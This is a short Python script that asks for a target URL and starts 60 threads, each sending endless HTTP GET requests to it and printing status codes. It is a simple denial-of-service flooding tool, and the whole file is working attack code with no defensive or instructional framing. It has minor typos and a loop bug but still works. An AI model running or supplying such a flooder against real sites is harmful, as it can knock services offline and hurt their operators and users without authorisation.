import requests
import threading
url = input("Enter taget url : ")
def send():

    while True:
        try:
            response = requests.get(url)
            print(f"statuse :{response.status_code}")
        except Exception as e:
            print(f"Error{e}")
            
            
            
thread=[]
for i in range(60):
   t=threading.Thread(target=send)
   t.daemon=True
   thread.append(t)
   t.start()
   
for thred in thread:
        t.join()
        